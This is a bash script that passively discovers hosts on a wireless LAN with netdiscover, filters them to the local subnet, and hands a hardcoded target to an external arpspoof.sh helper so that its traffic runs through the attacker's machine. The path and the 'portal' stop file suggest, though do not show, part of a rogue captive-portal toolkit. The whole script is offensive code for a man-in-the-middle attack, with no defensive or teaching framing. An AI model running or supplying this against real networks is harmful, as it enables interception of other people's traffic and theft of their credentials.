#!/bin/bash
lc=0;
r="192.168.1.1";
netdiscover -P -N -i wlan0 -r 192.168.1.1/24 -c 25 -L > /tmp/arp.list &
until [ -f "/tmp/stop.portal" ]; do
	nlc=`wc -l < /tmp/arp.list`;
	if [ $nlc != $lc ]; then
		dlc=$(($nlc-$lc));
		lc=$nlc;
		IFS=$'\n';
		for l in `tail -n $dlc /tmp/arp.list`; do
			pref=`ifconfig wlan0 | grep "inet " | awk '{print $2}' | cut -d . -f 1,2,3`;
			if [[ $l == *$pref* ]]; then
				ip=`echo $l | awk '{print $1}'`;
				if [ $ip != "0.0.0.0" ] && [ $ip != $r ] && [ $ip != `ifconfig wlan0 | grep "inet " | awk '{print $2}'` ] && [ $ip == "192.168.1.100" ]; then
					/root/Desktop/AlMAPRO/arpspoof.sh $ip $r;
					echo "Spoofed IP ==> $ip";
				fi;
			fi;
		done;
	fi;
done;

